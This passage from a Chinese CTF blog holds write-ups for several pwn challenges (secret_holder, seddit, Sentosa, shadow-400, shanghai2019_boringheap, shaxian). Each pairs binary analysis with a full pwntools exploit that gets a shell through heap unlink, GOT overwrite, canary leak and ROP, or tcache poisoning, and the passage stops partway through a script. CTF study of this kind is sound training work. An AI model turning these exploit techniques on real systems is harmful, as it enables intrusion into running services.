\n\n注意，最开始我们不知道有哪些文件，所以，第一次，我们的payload应该是这样\npadding = &#x27;a&#x27;*0x100    payload = padding + &#x27;ls;&#x27;.ljust(0x1B,&#x27; &#x27;) + hashlib.sha256(padding).hexdigest()  \n\n然后我们得到了文件名，再来第二次，得到答案\n由于程序使用的是popen,因此&#x2F;bin&#x2F;sh传进去不能交互。要执行一条命令，必须关闭程序，再来一次。\n我们最终的Exp脚本为\nfrom pwn import *  import hashlib    #sh = process(&#x27;./pwnh20&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,31436)    padding = &#x27;a&#x27;*0x100    payload = padding + &#x27;cat flag.txt;&#x27;.ljust(0x1B,&#x27; &#x27;) + hashlib.sha256(padding).hexdigest()    sh.sendline(payload)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","爆破"]},{"title":"secret_holder","url":"/2020/02/07/secret_holder/","content":"本题，附件在https://pwn-1253291247.cos.ap-chengdu.myqcloud.com/SecretHolder，刷题网站上没有提供\n拿到附件，我们先检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n\n\nFree后没有清空指针，可以造成多次重复free\n\n\n可以多次创建堆，只要我们free后再创建即可\n那么，本题，我们可以利用unsorted bin的unlink来攻击\n我们先创建一个huge的堆，然后释放huge堆，再创建一个small的堆，再创建一个big堆\n#申请一个大chunk  new(3,&#x27;a&#x27;*0x100)  delete(3)    #申请一个小chunk  new(1,&#x27;b&#x27;*0x10)  #申请一个中等chunk  new(2,&#x27;c&#x27;*0x100)  \n\n那么，内存中，三个堆的布局是这样的\n\n\n接下来我们把Small和Big的都free掉，那么在large bin里，有Huge的地址，在fastbin里，有Small的地址,unsorted bin里的big合并到了top块里去了。由于堆指针依然保留着，我们可以double free那个Big块。当我们重新申请Huge的空间回来时，由于**[使用的是calloc，导致Huge内容全部被清空]{.mark}，也就是Small、Big的结构体信息也会没有了。[我们要对Big做double free，因此我们既要在Small的位置伪造假chunk，也要重新构造好Big结构体，还有在Big后面再伪造几个假chunk，绕过检查]{.mark}**\n#释放chunk0和chunk1  delete(1)  delete(2)    #构造假chunk  fake_chunk = p64(0) + p64(0x21)  #fd,bk  fake_chunk += p64(huge_secret-0x18) + p64(huge_secret-0x10)  payload = fake_chunk.ljust(0x20,&#x27;\\x00&#x27;)  #prev_size size  payload += p64(0x20) + p64(0x90) + &#x27;c&#x27;*0x80 #chunk2  #prev_size size  payload += p64(0x90) + p64(0x81) + &#x27;d&#x27;*0x70 #chunk3  #prev_size size  payload += p64(0) + p64(0x81) #chunk4  #重新申请large chunk，使得分配到的位置与chu  new(3,payload)  \n\n现在，堆的布局是这样的\n\n\n我们再次free那个Big，Big就会与Fake_chunk1发生unlink，而Fake_chunk3、Fake_chunk4是为了绕过边界检查。这样，我们就将large堆的指针指向了堆数组本身，我们就能自由的控制堆指针了。我们先把free的got表修改成puts的plt地址，这样，free时就能泄露出信息。\n综上，我们的exp脚本\n#coding:utf8  from pwn import *  from LibcSearcher import *    sh = process(&#x27;./SecretHolder&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,58439)  elf = ELF(&#x27;./SecretHolder&#x27;)  #huge_secret指针的地址  huge_secret = 0x6020A8  bss_addr = 0x602090  free_got = elf.got[&#x27;free&#x27;]  puts_plt = elf.plt[&#x27;puts&#x27;]  read_got = elf.got[&#x27;read&#x27;]    def new(h_type,content):     sh.sendlineafter(&#x27;3. Renew secret&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;3. Huge secret&#x27;,str(h_type))     sh.sendlineafter(&#x27;Tell me your secret:&#x27;,content)    def delete(h_type):     sh.sendlineafter(&#x27;3. Renew secret&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;3. Huge secret&#x27;,str(h_type))    def edit(h_type,content):     sh.sendlineafter(&#x27;3. Renew secret&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;3. Huge secret&#x27;,str(h_type))     sh.sendafter(&#x27;Tell me your secret:&#x27;,content)    #申请一个大chunk  new(3,&#x27;a&#x27;*0x100)  delete(3)    #申请一个小chunk  new(1,&#x27;b&#x27;*0x10)  #申请一个中等chunk  new(2,&#x27;c&#x27;*0x100)    #释放chunk0和chunk1  delete(1)  delete(2)    #构造假chunk  fake_chunk = p64(0) + p64(0x21)  #fd,bk  fake_chunk += p64(huge_secret-0x18) + p64(huge_secret-0x10)  payload = fake_chunk.ljust(0x20,&#x27;\\x00&#x27;)  #prev_size size  payload += p64(0x20) + p64(0x90) + &#x27;c&#x27;*0x80 #chunk2  #prev_size size  payload += p64(0x90) + p64(0x81) + &#x27;d&#x27;*0x70 #chunk3  #prev_size size  payload += p64(0) + p64(0x81) #chunk4  #重新申请large chunk，使得分配到的位置与chu  new(3,payload)    #unlink 3这个large bin  delete(2)  #现在，我们可以自由控制三个堆指针了，先修改三个堆指针  payload = p64(0) * 2 + p64(free_got) + p64(bss_addr) + p64(read_got) + p32(1)*3  edit(3,payload)    #修改free的got表为puts的plt  edit(2,p64(puts_plt))  #泄露read的地址  delete(1)  sh.recvuntil(&#x27;\\n&#x27;)  read_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  libc = LibcSearcher(&#x27;read&#x27;,read_addr)  libc_base = read_addr - libc.dump(&#x27;read&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  print &#x27;libc_base=&#x27;,hex(read_addr)  print &#x27;system_addr=&#x27;,hex(system_addr)  #修改free的got表内容，指向system  edit(2,p64(system_addr))  #修改堆1指针，指向/bin/sh字符串  edit(3,p64(0) * 2 + p64(binsh_addr))  #system(&quot;/bin/sh&quot;)  delete(2)    sh.interactive()  ","categories":["CTF"],"tags":["unlink","unsorted bin","UAF"]},{"title":"seddit","url":"/2020/02/09/seddit/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n是一个模拟登陆的程序，密码就是用户名用salt+key来加密后的结果\n\n\n只要我们能够成功登陆admin账号，就能输出答案\n\n\n溢出点在这\n\n\n我们可以**[让salt的长度为16，这样，key的内容就会写到v5的地址处，这样我们后面再输出，就能得到key]{.mark}**，然后我们加密admin字符串，即可得到密码登陆\n综上，我们的exp脚本\n1.\t#coding:utf8  2.\tfrom pwn import *  3.\tfrom ctypes import *  4.\timport binascii  5.\t  6.\tsh = process(&#x27;./seddit&#x27;)  7.\t#sh = remote(&#x27;111.198.29.45&#x27;,49317)  8.\t  9.\tcryptolib = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libcrypto.so.1.0.0&#x27;)  10.\t  11.\tdef register(salt):  12.\t   sh.sendlineafter(&#x27;What would you like to do?&#x27;,&#x27;1&#x27;)  13.\t   sh.sendlineafter(&#x27;Enter username:&#x27;,&#x27;seaase&#x27;)  14.\t   sh.sendlineafter(&#x27;Enter salt:&#x27;,salt)  15.\t  16.\tdef login(password):  17.\t   sh.sendlineafter(&#x27;What would you like to do?&#x27;,&#x27;2&#x27;)  18.\t   sh.sendlineafter(&#x27;Enter username:&#x27;,&#x27;admin&#x27;)  19.\t   sh.sendlineafter(&#x27;Enter password:&#x27;,password)  20.\t  21.\tdef show():  22.\t   sh.sendlineafter(&#x27;What would you like to do?&#x27;,&#x27;3&#x27;)  23.\t   sh.sendlineafter(&#x27;Title:&#x27;,&#x27;Leak&#x27;)  24.\t   sh.sendlineafter(&#x27;What type of post?&#x27;,&#x27;0&#x27;)  25.\t  26.\tpayload = &#x27;a&#x27;*0x10  27.\tregister(payload)  28.\t#泄露key  29.\tshow()  30.\tsh.recvuntil(&#x27;content: &#x27;)  31.\tkey = sh.recvuntil(&#x27;\\n&#x27;,drop = True)[0:7]  32.\tprint &#x27;key=&#x27;,key  33.\tpasswd = &#x27;a&#x27;*7 + key  34.\tuser = &#x27;admin&#x27;  35.\t#加密，得到密码  36.\tkey = (c_char * 8)(&#x27;\\x00&#x27;)  37.\tdes_key_schedule = (c_char * 128)(&#x27;\\x00&#x27;)  38.\tans_out = (c_char * 256)(&#x27;\\x00&#x27;)  39.\tcryptolib.DES_string_to_key(passwd,key)  40.\tcryptolib.DES_set_key(key,des_key_schedule)  41.\tcryptolib.DES_ecb_encrypt(user,ans_out,des_key_schedule,1)  42.\tpassword = &#x27;&#x27;  43.\tfor i in range(len(ans_out)):  44.\t  c = ans_out[i]  45.\t  if c == &#x27;\\x00&#x27;:  46.\t     break;  47.\t  password += c  48.\tpassword = binascii.b2a_hex(password)  49.\tprint &#x27;password=&#x27;,password  50.\t  51.\t#得到flag  52.\tlogin(password)  53.\tsh.interactive()  ","categories":["CTF"],"tags":["栈溢出","数据泄露"]},{"title":"Sentosa","url":"/2020/02/12/sentosa/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，一个经典的增删改查程序\n\n\n经过分析，程序中不存在堆溢出漏洞，唯一的漏洞在这里\n\n\n如果a2是0，就会造成输入长度无限制,因为0-1变成-1，传给read，而read的size参数为无符号数，导致-1转换成无符号数，很大，可以无限制输入。\n最终造成create函数里栈溢出，覆盖v6指针\n\n\n而v6指针是什么呢？\n\n\nV6是堆指针，我们**[溢出后覆盖成其他地址被保存到global_heaps里面，我们可以实现任意地址读写]{.mark}**\n我们要泄露libc地址，获取需要的函数，因此，我们需要利用unsorted bin，那么就需要伪造unsorted bin范围的chunk。当我们伪造好了fake_chunk，我们就要想办法free掉它，这就需要利用栈溢出覆盖v6指针为fake_chunk的地址，这样，我们下一次就能free它了。因此，我们**[首先得泄露堆地址。]{.mark}**\n由于不存在UAF，因此，我们利用栈溢出覆盖v6指针为释放后的chunk的地址，然后show就可以泄露出堆地址了。\n[由于输入的size为0会造成无限输入，因此我们需要用’n’结束输入，而n会被替换成’x00’]{.mark}，也就是说，我们最先不知道堆地址的情况下，想要泄露堆地址，就得使用低1字节覆盖。而低1字节注定为0，那么，也就是我们**[最终会让v6指向chunk0]{.mark}**，那么，我们就得让chunk0里留下堆指针才行，因此，我们先释放其他chunk,将chunk0的释放放到后面，由于fastbin采用头插法链接chunk，因此在chunk0的fd域就会留下指针\n#0  create(0x3,&#x27;a&#x27;*0x2)  #1  create(0x3,&#x27;b&#x27;*0x2)  #2  create(0x3,&#x27;c&#x27;*0x2)  #3  create(0x3,&#x27;d&#x27;*0x2)  #4  create(0x3,&#x27;e&#x27;*0x2)    delete(1)  delete(0)  delete(2)  #覆盖堆指针低位为0，使得它指向chunk0，chunk0里保存着堆指针，可以供我们泄露  create(0,&#x27;a&#x27;*0x5A) #chunk2重新申请回来  #泄露堆地址  show()  sh.recvuntil(&#x27;Capacity: &#x27;)  h = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True))  if h &lt; 0:     h = 0x100000000 + h  heap_addr = (0x55 &lt;&lt; 4 * 8) + h &lt;&lt; 8  print &#x27;heap_addr=&#x27;,hex(heap_addr)  \n\n接下来，我们就要伪造unsorted bin范围的chunk了，为了能够free这个fake_chunk，我们还得精心构造，绕过程序中的这个检测\n\n\n并且，[空字节不会被写到堆里，因为程序中使用了strncpy，遇到’x00’就会截断]{.mark}，因此，伪造这个fake_chunk需要精心考虑\n\n\n如下，我们控制price为0x1000，使得我们在这个chunk里伪造的fake_chunk正好满足程序的要求，即fake_chunk + *fake_chunk + 5 = 1\n#1,size = 0x20 + 0x80 = 0xA0  fake_chunk = &#x27;d&#x27;*4 + &#x27;\\xA1&#x27;  #控制price的值，使得符合位置为1，绕过检查  create(0xB,fake_chunk,0x10000)  #2  create(0x59,&#x27;f&#x27;*0x58)  #5  create(0x59,&#x27;g&#x27;*0x58)  #6  #覆盖堆指针低位为0，使得它指向我们伪造的fake_chunk  create(0,&#x27;a&#x27;*0x5A + p64(heap_addr + 0xC0))  #fake_chunk放入unsorted bin  delete(6)  #覆盖堆指针低位，使得它指向我们伪造的fake_chunk，因为此时fake_chunk里面有libc指针  create(0,&#x27;b&#x27;*0x5A + p64(heap_addr + 0xC0-4)) #6  #泄露libc指针  show()  sh.recvuntil(&#x27;Project: ggggggggggggggg&#x27;)  sh.recvuntil(&#x27;Project: &#x27;)  main_arena_xx = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_hook_s  environ_addr = libc_base + environ  system_addr = libc_base + system_s  binsh_addr = libc_base + binsh_s  pop_rdi_addr = libc_base + pop_rdi  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;environ_addr=&#x27;,hex(environ_addr)  \n\n现在，我们还差canary了，我们只要有了canary的值，就可以用栈溢出做ROP了。那么，我们需要泄露栈地址，而libc中的environ变量保存着栈地址，我们利用栈溢出把v6指针覆盖为environ的地址后show，就能得到栈地址。然后，我们计算出canary存放的位置，用同样的方法泄露canary后栈溢出ROP即可getshell。\n#同理，接下来，我们覆盖堆指针为environ_addr附近，这样我们可以泄露栈里面的内容  #需要注意的是，由于有了unsorted bin，我们新申请的块会从unsorted bin里面切割，导致show的时候发生错误  #因此，我们delete(3)，让我们申请的块直接拿fastbin里面的chunk3来，而不从unsorted bin里面切割  delete(3)  create(0,&#x27;b&#x27;*0x5A + p64(environ_addr-4))  show()  sh.recvuntil(&#x27;Project: fffffffffffffff&#x27;)  sh.recvuntil(&#x27;Project: &#x27;)  stack_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  print &#x27;stack_addr=&#x27;,hex(stack_addr)  \n\n我们最终的exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./sentosa&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,36218)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]  #借助environ,我们可以泄露栈地址  environ = libc.symbols[&#x27;environ&#x27;]  system_s = libc.sym[&#x27;system&#x27;]  binsh_s = libc.search(&#x27;/bin/sh&#x27;).next()  pop_rdi = 0x21102    def create(size,name,price=0, area=0, capacity=0):     sh.sendlineafter(&#x27;5. Exit&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Input length of your project name:&#x27;,str(size))     sh.sendlineafter(&#x27;Input your project name:&#x27;,name)     sh.sendlineafter(&#x27;Input your project price:&#x27;,str(price))     sh.sendlineafter(&#x27;Input your project area:&#x27;,str(area))     sh.sendlineafter(&#x27;Input your project capacity:&#x27;,str(capacity))    def show():     sh.sendlineafter(&#x27;5. Exit&#x27;,&#x27;2&#x27;)    def delete(index):     sh.sendlineafter(&#x27;5. Exit&#x27;,&#x27;4&#x27;)     sh.sendlineafter(&#x27;Input your projects number:&#x27;,str(index))  #0  create(0x3,&#x27;a&#x27;*0x2)  #1  create(0x3,&#x27;b&#x27;*0x2)  #2  create(0x3,&#x27;c&#x27;*0x2)  #3  create(0x3,&#x27;d&#x27;*0x2)  #4  create(0x3,&#x27;e&#x27;*0x2)    delete(1)  delete(0)  delete(2)  #覆盖堆指针低位为0，使得它指向chunk0，chunk0里保存着堆指针，可以供我们泄露  create(0,&#x27;a&#x27;*0x5A) #chunk2重新申请回来  #泄露堆地址  show()  sh.recvuntil(&#x27;Capacity: &#x27;)  h = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True))  if h &lt; 0:     h = 0x100000000 + h  heap_addr = (0x55 &lt;&lt; 4 * 8) + h &lt;&lt; 8  print &#x27;heap_addr=&#x27;,hex(heap_addr)  #1,size = 0x20 + 0x80 = 0xA0  fake_chunk = &#x27;d&#x27;*4 + &#x27;\\xA1&#x27;  #控制price的值，使得符合位置为1，绕过检查  create(0xB,fake_chunk,0x10000)  #2  create(0x59,&#x27;f&#x27;*0x58)  #5  create(0x59,&#x27;g&#x27;*0x58)  #6  #覆盖堆指针低位为0，使得它指向我们伪造的fake_chunk  create(0,&#x27;a&#x27;*0x5A + p64(heap_addr + 0xC0))  #fake_chunk放入unsorted bin  delete(6)  #覆盖堆指针低位，使得它指向我们伪造的fake_chunk，因为此时fake_chunk里面有libc指针  create(0,&#x27;b&#x27;*0x5A + p64(heap_addr + 0xC0-4)) #6  #泄露libc指针  show()  sh.recvuntil(&#x27;Project: ggggggggggggggg&#x27;)  sh.recvuntil(&#x27;Project: &#x27;)  main_arena_xx = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_hook_s  environ_addr = libc_base + environ  system_addr = libc_base + system_s  binsh_addr = libc_base + binsh_s  pop_rdi_addr = libc_base + pop_rdi  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;environ_addr=&#x27;,hex(environ_addr)  #同理，接下来，我们覆盖堆指针为environ_addr附近，这样我们可以泄露栈里面的内容  #需要注意的是，由于有了unsorted bin，我们新申请的块会从unsorted bin里面切割，导致show的时候发生错误  #因此，我们delete(3)，让我们申请的块直接拿fastbin里面的chunk3来，而不从unsorted bin里面切割  delete(3)  create(0,&#x27;b&#x27;*0x5A + p64(environ_addr-4))  show()  sh.recvuntil(&#x27;Project: fffffffffffffff&#x27;)  sh.recvuntil(&#x27;Project: &#x27;)  stack_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  print &#x27;stack_addr=&#x27;,hex(stack_addr)  #定位canary的位置，注意的是在canary前面那个地址要至少有3字节0，和canary的最后一字节0，组成4字节数据，代表chunk的大小为0  #不然要出错，因此，我们找到了这个地方有一个符合的  canary_addr = stack_addr - 0x130  print &#x27;canary_addr=&#x27;,hex(canary_addr)  #用同样的方法泄露canary  delete(4)  create(0,&#x27;b&#x27;*0x5A + p64(canary_addr-3))  show()  sh.recvuntil(&#x27;Project: fffffffffffffff&#x27;)  sh.recvuntil(&#x27;Project: &#x27;)  sh.recvuntil(&#x27;Project: &#x27;)  canary = u64(&#x27;\\x00&#x27; + sh.recvuntil(&#x27;\\n&#x27;,drop = True))  print &#x27;canary=&#x27;,hex(canary)  #栈溢出，构造ROP  payload = &#x27;a&#x27;*0x68 + p64(canary) + p64(0)*5 + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)  create(0,payload)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","ROP","unsorted bin","变量覆盖"]},{"title":"shadow-400(自己实现的call、ret)","url":"/2020/02/12/shadow-400/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n程序里面自己实现了call和ret\n\n\ncall函数\n\n\npush函数\n\n\n这是主功能区\n\n\n看不出什么，我们来分析汇编代码\n\n\n[atoi的结果是一个有符号的数，而getline的长度参数为无符号数，为了绕过0x20个长度的限制，我们只需输入负数，即可，就可以栈溢出了。]{.mark}\n首先，我们需要泄露libc地址，那么我们只需泄露任意一个libc函数地址即可，我们可以栈溢出，覆盖ebp+arg_0里面的指针为函数的got表，即可泄露了，同时，为了增加利用次数，我们把[ebp+arg8]覆盖为一个很大的数，比如0x100\n\n\n原本只能利用3次，现在，我们覆盖了[ebp+arg_8]的值，就可以多次利用了\n\n\n#覆盖指针,覆盖getline的长度,覆盖循环最大次数，用于泄露函数地址及多次利用  payload = &#x27;a&#x27;*0x34 + p32(atoi_got) + p32(0x100) + p32(0x100)  setMessage(payload)  sh.recvuntil(&#x27;&lt;&#x27;)  atoi_addr = u32(sh.recv(4))  print &#x27;atoi_addr=&#x27;,hex(atoi_addr)  libc = LibcSearcher(&#x27;atoi&#x27;,atoi_addr)  libc_base = atoi_addr - libc.dump(&#x27;atoi&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  \n\n现在，我们可以构造ROP了？？如果是一般的步骤，直接构造ROP就可以getshell了，然而，本题没有这么简单。本题自己实现了个shadow call和shadow ret，自己申请了一片空间专门用来管理返回地址，[因此，我们覆盖栈里的当前函数的返回地址没有用。因为ret()函数是从自己的那片空间里取出地址返回。]{.mark}\n也就是说，只要是这个二进制里的几个函数都不行，那么我们可以考虑**[劫持libc中的函数的返回地址。因为libc中没有使用这个shadow call和ret。]{.mark}**\n我们可以直接劫持read的返回地址，这样read结束后直接就执行ROP了。\n注意到这里，利用之前的栈溢出，我们覆盖[ebp+arg_0]指针可以实现任意地址读写，如果本题没有FULL RELRO，我们都可以直接在这里修改GOT表了。\n\n\n我们**[只需把[ebp+arg_0覆盖为] read的返回地址在栈里存放的位置，然后在这里输入ROP即可]{.mark}**\n因此，我们还需要泄露栈地址，这样才能确定read返回地址存放的位置。有两种方法泄露栈地址\n#泄露栈地址，然后，我们可以计算出劫持read的返回地址存放在栈里的位置  setName(&#x27;zhaohai&#x27;.ljust(0x10,&#x27;a&#x27;))  setMessage(&#x27;hello,I am zhaohai&#x27;)  sh.recvuntil(&#x27;&lt;&#x27;)  sh.recv(0x1C)  stack_addr = u32(sh.recv(4))  changeName(&#x27;n&#x27;)  print &#x27;stack_addr=&#x27;,hex(stack_addr)  #我们需要利用setName修改这个地方，这里是libc中read返回地址存放处，这里布下ROP即可  target_addr = stack_addr - 0x100  \n\n综上，我们完整的exp脚本\n#coding:utf8  from pwn import *  from LibcSearcher import *    #sh = process(&#x27;./shadow-400&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,54578)  elf = ELF(&#x27;./shadow-400&#x27;)  atoi_got = elf.got[&#x27;atoi&#x27;]    def setName(name):     sh.sendafter(&#x27;Input name :&#x27;,name)    def setMessage(message):     #-1转换为无符号数，就很大，造成read溢出栈     sh.sendlineafter(&#x27;Message length :&#x27;,&#x27;-1&#x27;)     sh.sendafter(&#x27;Input message :&#x27;,message)    def changeName(c):     sh.sendlineafter(&#x27;Change name?&#x27;,c)    #泄露栈地址，然后，我们可以计算出劫持read的返回地址存放在栈里的位置  setName(&#x27;zhaohai&#x27;.ljust(0x10,&#x27;a&#x27;))  setMessage(&#x27;hello,I am zhaohai&#x27;)  sh.recvuntil(&#x27;&lt;&#x27;)  sh.recv(0x1C)  stack_addr = u32(sh.recv(4))  changeName(&#x27;n&#x27;)  print &#x27;stack_addr=&#x27;,hex(stack_addr)  #我们需要利用setName修改这个地方，这里是libc中read返回地址存放处，这里布下ROP即可  target_addr = stack_addr - 0x100  #覆盖指针,覆盖getline的长度,覆盖循环最大次数，用于泄露函数地址及多次利用  payload = &#x27;a&#x27;*0x34 + p32(atoi_got) + p32(0x100) + p32(0x100)  setMessage(payload)  sh.recvuntil(&#x27;&lt;&#x27;)  atoi_addr = u32(sh.recv(4))  print &#x27;atoi_addr=&#x27;,hex(atoi_addr)  libc = LibcSearcher(&#x27;atoi&#x27;,atoi_addr)  libc_base = atoi_addr - libc.dump(&#x27;atoi&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  changeName(&#x27;n&#x27;)  #覆盖指针，然后我们利用setName写数据到目标处  payload = &#x27;a&#x27;*0x34 + p32(target_addr)  setMessage(payload)  #现在，可以发送ROP了  rop = p32(system_addr) + p32(0) + p32(binsh_addr)  setName(rop)      sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","ret2lib"]},{"title":"shanghai2019_boringheap","url":"/2020/06/10/shanghai2019_boringheap(abs%E5%87%BD%E6%95%B0%E6%BA%A2%E5%87%BA%E7%82%B9)/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，edit函数里使用了abs函数，abs函数接收4字节有符号int数，当传入0x80000000时，其返回结果仍然是0x80000000，由于4字节int正数将无法表示这么大，因此，其值是一个负数，由此，可以造成堆溢出。\n\n\n然后就可以利用了\n#coding:utf8from pwn import *#sh = process(&#x27;./shanghai2019_boringheap&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25580)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]system_s = libc.sym[&#x27;system&#x27;]def add(type,content):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;3.Large&#x27;,str(type))   sh.sendlineafter(&#x27;Input Content:&#x27;,content)def edit(index,offset,content):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Which one do you want to update?&#x27;,str(index))   sh.sendlineafter(&#x27;Where you want to update?&#x27;,str(offset))   sh.sendlineafter(&#x27;Input Content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Which one do you want to delete?&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Which one do you want to view?&#x27;,str(index))for i in range(20):   add(2,&#x27;a&#x27;)#向上溢出，修改到自身的头，伪造一个large binpayload = &#x27;\\x00&#x27;*0x18 + p64(0x441)edit(0,0x80000000,payload)delete(0)add(2,&#x27;a&#x27;) #20show(1)sh.recvuntil(&#x27;\\n&#x27;)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)add(2,&#x27;a&#x27;) #21delete(1)edit(21,0,p64(free_hook_addr))add(2,&#x27;/bin/sh\\x00&#x27;) #22add(2,p64(system_addr))#getshelldelete(22)sh.interactive()","categories":["CTF"],"tags":["tcache","堆溢出","abs函数溢出"]},{"title":"shaxian","url":"/2020/02/09/shaxian/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n功能1存在溢出\n\n\nfree后没有清空指针\n\n\n我们先**[创建链表三个节点，程序使用的是头插法，因此，当我们释放的时候，第一个节点最后释放，而当我们再申请同样大小的块时，由于fastbin的特性，第一个块就先被申请回来了，这样，我们溢出到节点2的结构体，覆盖指针为函数got表，就能泄露信息]{.mark}**\n#头插法建立链表,chunk0最后被释放  add(&#x27;10&#x27;,&#x27;a&#x27;) #0  add(&#x27;10&#x27;,&#x27;b&#x27;) #1  add(&#x27;10&#x27;,&#x27;c&#x27;) #2  #释放链表，但不清空指针  delete()  #把chunk0申请回来，并且在chunk0代表的结构体链表链接上puts的got表地址，这样我们再次show的时候就可以泄露信息  payload = &#x27;a&#x27;*0x20 + p32(puts_got-0x4)  #prev_size size fd  payload += p32(0) + p32(0x31) + p32(ptr-0x10) #chunk1  add(&#x27;10&#x27;,payload)  \n\n然后，我们show，就能泄露信息了\nshow()  sh.recvuntil(&#x27;* 10\\n&#x27;)  puts_addr = u32(sh.recv(4))  #print &#x27;puts_addr=&#x27;,hex(puts_addr)  libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)  libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  \n\n接下来，我们想办法修改atoi的got表内容为system地址，由于fastbin特性，我们不能直接申请到atoi的got表处，因此，我们得想其他办法。只要我们**[控制了dword_804B1C0这个链表头指针，我们就能对指定位置进行读写，因此，我们只要申请到这个指针附近，就可以控制它。]{.mark}**\n因此，看到之前，我们在覆盖节点1(chunk0)的next指针时，顺便把chunk1的fd指针指向了ptr-0x10处，因为我们准备在这附近伪造一个大小一样的chunk结构，就可以申请到这里。\n而这个fake_chunk，我们得事先伪好，因此在程序一开始的时候\nfake_chunk = p32(0) + p32(0x31)    #为了能够控制堆指针ptr，我们在ptr上面可控靠近区伪造一个0x31的假chunk链接到fastbin，然后申请到这里即可    payload = &#x27;d&#x27;*(0x100-0x10) + fake_chunk    sh.sendlineafter(&#x27;Your Phone number:&#x27;,payload)    \n\n当我们申请到fake_chunk处时，就可以顺便修改atoi的got表了，我们再重新来看看程序的插入逻辑\nint sub_80488AF()  &#123;    _DWORD *v0; // ebx    int v2; // [esp+1Ch] [ebp-Ch]      v2 = dword_804B1C0;    puts(&quot;CHI SHEN ME?&quot;);    puts(&quot;1.Banmian&quot;);    puts(&quot;2.Bianrou&quot;);    puts(&quot;3.Qingtangmian&quot;);    puts(&quot;4.Jianbao&quot;);    puts(&quot;5.Jianjiao&quot;);    dword_804B1C0 = (int)malloc(0x28u);    if ( !dword_804B1C0 )      return puts(&quot;Error&quot;);    *(_DWORD *)(dword_804B1C0 + 36) = v2;    sub_804865D(0, dword_804B1C0 + 4, 0x3C, 10);    //程序执行到这时,dword_804B1C0已经变成了atoi_got了    puts(&quot;How many?&quot;);    v0 = (_DWORD *)dword_804B1C0;    //这句代码。正好把*(atoi_got)处给修改了    *v0 = sub_80486CD();    puts(&quot;Add to GOUWUCHE&quot;);    return dword_804B2E0++ + 1;  &#125;  \n\n综上，我们完整的exp\n#coding:utf8  from pwn import *  from LibcSearcher import *    #sh = process(&#x27;./shaxian&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,55897)  elf = ELF(&#x27;./shaxian&#x27;)  puts_got = elf.got[&#x27;puts&#x27;]  atoi_got = 